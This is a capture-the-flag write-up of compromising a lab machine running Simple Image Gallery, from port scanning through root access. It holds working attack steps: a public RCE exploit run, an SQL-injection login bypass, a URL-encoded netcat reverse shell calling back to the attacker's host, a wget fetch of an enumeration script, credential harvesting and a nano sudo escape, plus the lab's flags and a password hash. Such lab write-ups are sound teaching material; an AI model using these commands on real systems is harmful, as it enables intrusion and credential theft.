# Gallery

Laurent Chauvin | April 14, 2024

## Resources

[1] https://www.revshells.com/
[2] https://maxat-akbanov.com/how-to-stabilize-a-simple-reverse-shell-to-a-fully-interactive-terminal
[3] https://gtfobins.github.io/gtfobins/nano/

## Progress

```
export IP=10.10.209.207
```

#### Task 1 : Deploy and get a Shell

1. How many ports are open?

Nmap scan:

```bash
nmap -sC -sV -oN nmap/initial 10.10.209.207

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-14 21:36 EDT
Nmap scan report for 10.10.209.207
Host is up (0.13s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
8080/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Simple Image Gallery System

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 31.34 seconds
```

2. What's the name of the CMS?

Homepage is just an Apache default page.

We can see on the nmap scan `Simple Image Gallery System` which is a Joomla plugin. We can find it at http://10.10.209.207/gallery

3. What's the hash password of the admin user?

Not sure if it's gonna be useful, but we can see this in the page source code:

```html
<!--  <p class="mb-1">
        <a href="forgot-password.html">I forgot my password</a>
      </p> 
-->
```

Page does not seems on the server though.

Let's search for an exploit:

```bash
searchsploit "Simple Image Gallery"      
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Exploit Title                                                                                                                                                                                            |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Joomla Plugin Simple Image Gallery Extended (SIGE) 3.5.3 - Multiple Vulnerabilities                                                                                                                       | php/webapps/49064.txt
Joomla! Component Kubik-Rubik Simple Image Gallery Extended (SIGE) 3.2.3 - Cross-Site Scripting                                                                                                           | php/webapps/44104.txt
Simple Image Gallery 1.0 - Remote Code Execution (RCE) (Unauthenticated)                                                                                                                                  | php/webapps/50214.py
Simple Image Gallery System 1.0 - 'id' SQL Injection                                                                                                                                                      | php/webapps/50198.txt
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Shellcodes: No Results
```

I'm not sure if it's version 1.0, couldn't find any evidences, but let's try the RCE exploit:

```bash
python 50214.py

TARGET = http://10.10.209.207/gallery/
Login Bypass
shell name TagovdensfxevzbrjyaLetta

protecting user

User ID : 1
Firsname : Adminstrator
Lasname : Admin
Username : admin

shell uploading
- OK -
Shell URL : http://10.10.209.207/gallery/uploads/1713145560_TagovdensfxevzbrjyaLetta.php?cmd=whoami
```

By looking at the exploit, we can see it's using the username `admin' or '1'='1'#` to bypass the password field.

Let's try on the website login page.

It works. We're in.

Let's look at the SQL injection exploit:

```bash
searchsploit -m php/webapps/50198.txt
```

Let's follow the instructions in it.

The vulnerable parameter is `id` in the `album` page.

After running `sqlmap` for a while, I didn't get much, so I choose a different path. We can already execute commands, so let's get shell.

After generating a command from [1] and url-encoding it, we get

```
http://10.10.209.207/gallery/uploads/1713145560_TagovdensfxevzbrjyaLetta.php?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Cbash%20-i%202%3E%261%7Cnc%2010.6.31.49%204444%20%3E%2Ftmp%2Ff
```

while listening on port 4444:

```bash
nc -lnvp 4444 

listening on [any] 4444 ...
connect to [10.6.31.49] from (UNKNOWN) [10.10.209.207] 54066
bash: cannot set terminal process group (809): Inappropriate ioctl for device
bash: no job control in this shell
www-data@gallery:/var/www/html/gallery/uploads$
```

We have a shell. But we don't have permissions to get the user flag. But let's not get ahead of ourselves, we want the admin password for now.
Let's check the sql credentials, from `config.php`:

```php
<?php
ob_start();
ini_set('date.timezone','Asia/Manila');
date_default_timezone_set('Asia/Manila');
session_start();

require_once('initialize.php');
require_once('classes/DBConnection.php');
require_once('classes/SystemSettings.php');
$db = new DBConnection;
$conn = $db->conn;

function redirect($url=''){
        if(!empty($url))
        echo '<script>location.href="'.base_url .$url.'"</script>';
}
function validate_image($file){
        if(!empty($file)){
                        return base_url.$file;
                        exit;
                if(is_file(base_app.$file)){
                        return base_url.$file;
                }else{
                        return base_url.'uploads/no-image-available.png';
                }
        }else{
                return base_url.'uploads/no-image-available.png';
        }
}
function isMobileDevice(){
    $aMobileUA = array(
        '/iphone/i' => 'iPhone', 
        '/ipod/i' => 'iPod', 
        '/ipad/i' => 'iPad', 
        '/android/i' => 'Android', 
        '/blackberry/i' => 'BlackBerry', 
        '/webos/i' => 'Mobile'
    );
    

    //Return true if Mobile User Agent is detected
    foreach($aMobileUA as $sMobileKey => $sMobileOS){
        if(preg_match($sMobileKey, $_SERVER['HTTP_USER_AGENT'])){
            return true;
        }
    }
    //Otherwise return false..  
    return false;
}
function scan_dir($dir) {
    $ignored = array('.', '..', '.svn', '.htaccess');

    $files = array();    
    foreach (scandir($dir) as $file) {
        if (in_array($file, $ignored)) continue;
        $files[$file] = filemtime($dir . '/' . $file);
    }

    arsort($files);
    $files = array_keys($files);

    return ($files) ? $files : false;
}
ob_end_flush();
```

We can see a `DBConnection` page, let's check this out:

```php
<?php
if(!defined('DB_SERVER')){
    require_once("../initialize.php");
}
class DBConnection{

    private $host = DB_SERVER;
    private $username = DB_USERNAME;
    private $password = DB_PASSWORD;
    private $database = DB_NAME;
    
    public $conn;
    
    public function __construct(){

        if (!isset($this->conn)) {
            
            $this->conn = new mysqli($this->host, $this->username, $this->password, $this->database);
            
            if (!$this->conn) {
                echo 'Cannot connect to database server';
                exit;
            }            
        }    
        
    }
    public function __destruct(){
        $this->conn->close();
    }
}
```

Nothing there. Let's check `initialize.php`:

```php
<?php
$dev_data = array('id'=>'-1','firstname'=>'Developer','lastname'=>'','username'=>'dev_oretnom','password'=>'5da283a2d990e8d8512cf967df5bc0d0','last_login'=>'','date_updated'=>'','date_added'=>'');

if(!defined('base_url')) define('base_url',"http://" . $_SERVER['SERVER_ADDR'] . "/gallery/");
if(!defined('base_app')) define('base_app', str_replace('\\','/',__DIR__).'/' );
if(!defined('dev_data')) define('dev_data',$dev_data);
if(!defined('DB_SERVER')) define('DB_SERVER',"localhost");
if(!defined('DB_USERNAME')) define('DB_USERNAME',"gallery_user");
if(!defined('DB_PASSWORD')) define('DB_PASSWORD',"passw0rd321");
if(!defined('DB_NAME')) define('DB_NAME',"gallery_db");
?>
```

Sweet !!! Let's connect to the sql db.

After connecting, I couldn't do much though. I needed to stabilize the shell first. See [2].

Let's connect again then:

```bash
www-data@gallery:/var/www/html/gallery/uploads$ mysql -u gallery_user -p

Enter password: passw0rd321
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 6009
Server version: 10.1.48-MariaDB-0ubuntu0.18.04.1 Ubuntu 18.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> 
```

Let's check databases:

```bash
MariaDB [(none)]> show databases;

+--------------------+
| Database           |
+--------------------+
| gallery_db         |
| information_schema |
+--------------------+
2 rows in set (0.00 sec)
```

Let's use `gallery_db` and check tables:

```bash
MariaDB [(none)]> use gallery_db
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

MariaDB [gallery_db]> show tables;
+----------------------+
| Tables_in_gallery_db |
+----------------------+
| album_list           |
| images               |
| system_info          |
| users                |
+----------------------+
4 rows in set (0.00 sec)
```

Let's check `users` table:

```bash
MariaDB [gallery_db]> select * from users;
+----+--------------+----------+----------+----------------------------------+-------------------------------------------------+------------+------+---------------------+---------------------+
| id | firstname    | lastname | username | password                         | avatar                                          | last_login | type | date_added          | date_updated        |
+----+--------------+----------+----------+----------------------------------+-------------------------------------------------+------------+------+---------------------+---------------------+
|  1 | Adminstrator | Admin    | admin    | a228b12a08b6527e7978cbe5d914531c | uploads/1713145560_TagovdensfxevzbrjyaLetta.php | NULL       |    1 | 2021-01-20 14:02:37 | 2024-04-15 01:46:38 |
+----+--------------+----------+----------+----------------------------------+-------------------------------------------------+------------+------+---------------------+---------------------+
1 row in set (0.00 sec)
```

4. What's the user flag?

Let's check the home directory:

```bash
www-data@gallery:/var/www/html/gallery/uploads$ ls -al /home/mike

total 44
drwxr-xr-x 6 mike mike 4096 Aug 25  2021 .
drwxr-xr-x 4 root root 4096 May 20  2021 ..
-rw------- 1 mike mike  135 May 24  2021 .bash_history
-rw-r--r-- 1 mike mike  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 mike mike 3772 May 20  2021 .bashrc
drwx------ 3 mike mike 4096 May 20  2021 .gnupg
drwxrwxr-x 3 mike mike 4096 Aug 25  2021 .local
-rw-r--r-- 1 mike mike  807 Apr  4  2018 .profile
drwx------ 2 mike mike 4096 May 24  2021 documents
drwx------ 2 mike mike 4096 May 24  2021 images
-rwx------ 1 mike mike   32 May 14  2021 user.txt
```

User flag can only be read by `mike` user.

Let's upload `linpeas.sh`. Start a server on local machine:

```bash
python3 -m http.server 8081
```

Then download get linpeas on target machine:

```bash
wget 10.6.31.49:8081/linpeas.sh
```

Then run it.

Lots of findings here. Let's go step by step. First we find:


```bash
╔══════════╣ Readable files inside /tmp, /var/tmp, /private/tmp, /private/var/at/tmp, /private/var/tmp, and backup folders (limit 70)
-rwxr-xr-x 1 root root 3772 May 24  2021 /var/backups/mike_home_backup/.bashrc                                                                                                                                                              
-rwxr-xr-x 1 root root 135 May 24  2021 /var/backups/mike_home_backup/.bash_history
-rwxr-xr-x 1 root root 220 May 24  2021 /var/backups/mike_home_backup/.bash_logout
-rwxr-xr-x 1 root root 20549 May 24  2021 /var/backups/mike_home_backup/images/23-04.jpg
-rwxr-xr-x 1 root root 159262 May 24  2021 /var/backups/mike_home_backup/images/my-cat.jpg
-rwxr-xr-x 1 root root 436526 May 24  2021 /var/backups/mike_home_backup/images/26-04.jpg
-rwxr-xr-x 1 root root 103 May 24  2021 /var/backups/mike_home_backup/documents/accounts.txt
-rwxr-xr-x 1 root root 807 May 24  2021 /var/backups/mike_home_backup/.profile
```

This file looks interesting `-rwxr-xr-x 1 root root 103 May 24  2021 /var/backups/mike_home_backup/documents/accounts.txt`. Let's check it out:

```basH
cat /var/backups/mike_home_backup/documents/accounts.txt

Spotify : mike@gmail.com:mycat666
Netflix : mike@gmail.com:123456789pass
TryHackme: mike:darkhacker123
```

The accounts in `accounts.txt` seems to be linked to other stuffs, but maybe some password were re-used.

Let's try to log as `mike` first with the password `darkhacker123`. Nothing. `123456789pass`. Nothing. `mycat666`. Nothing.

We also find:

```bash
╔══════════╣ Unexpected in /opt (usually empty)
total 12                                                                                                                                                                                                                                    
drwxr-xr-x  2 root root 4096 May 22  2021 .
drwxr-xr-x 23 root root 4096 Feb 12  2022 ..
-rw-r--r--  1 root root  364 May 20  2021 rootkit.sh
```

and 

```bash
╔══════════╣ .sh files in path
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#script-binaries-in-path                                                                                                                                                  
/usr/bin/gettext.sh 
```

`rookit.sh` cannot be executed. `gettext.sh` does not seems to do much.

We also find:

```bash
╔══════════╣ Searching passwords in history files
/usr/lib/ruby/vendor_ruby/rake/thread_history_display.rb:      @stats   = stats                                                                                                                                                             
/usr/lib/ruby/vendor_ruby/rake/thread_history_display.rb:      @items   = { _seq_: 1  }
/usr/lib/ruby/vendor_ruby/rake/thread_history_display.rb:      @threads = { _seq_: "A" }
/var/backups/mike_home_backup/.bash_history:sudo -lb3stpassw0rdbr0xx
/var/backups/mike_home_backup/.bash_history:sudo -l
```

Maybe someone typed their password too fast ;). Let's try:

```bash
www-data@gallery:/var/backups/mike_home_backup$ su mike          
Password: 
mike@gallery:/var/backups/mike_home_backup$ whoami
mike
```

Sweet !! Let's get the flag:

```bash
mike@gallery:/var/backups/mike_home_backup$ cat /home/mike/user.txt

THM{af05cd30bfed67849befd546ef}
```

#### Task 2 : Escalate to the root user

5. What's the root flag?

Let's check what `mike` can sudo:

```bash
mike@gallery:/var/backups/mike_home_backup$ sudo -l
Matching Defaults entries for mike on gallery:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User mike may run the following commands on gallery:
    (root) NOPASSWD: /bin/bash /opt/rootkit.sh
```

How interesting !! Let's try to run this `rootkit.sh` now:

```bash
mike@gallery:/var/backups/mike_home_backup$ sudo /bin/bash /opt/rootkit.sh

Would you like to versioncheck, update, list or read the report ? 
```

Let's check what the rootkit is doing:

```bash
www-data@gallery:/var/backups/mike_home_backup$ cat /opt/rootkit.sh

#!/bin/bash

read -e -p "Would you like to versioncheck, update, list or read the report ? " ans;

# Execute your choice
case $ans in
    versioncheck)
        /usr/bin/rkhunter --versioncheck ;;
    update)
        /usr/bin/rkhunter --update;;
    list)
        /usr/bin/rkhunter --list;;
    read)
        /bin/nano /root/report.txt;;
    *)
        exit;;
esac
```

if we do `read` we can open a file in `/root`. Let's check if we can do something with `nano`. From [2], we see we can try to break out of the restricted environment, so let's try:

```bash
mike@gallery:/var/backups/mike_home_backup$ sudo /bin/bash /opt/rootkit.sh

Would you like to versioncheck, update, list or read the report ? read

^R^X
reset; sh 1>&0 2>&0
```

And then:

```bash
# whoami

root
```

Let's get the final flag:

```bash
# cat /root/root.txt

THM{ba87e0dfe5903adfa6b8b450ad7567bafde87}
```

## Flag

1. `2`

2. `Simple Image Gallery`

3. `a228b12a08b6527e7978cbe5d914531c`

4. `THM{af05cd30bfed67849befd546ef}`

5. `THM{ba87e0dfe5903adfa6b8b450ad7567bafde87}`

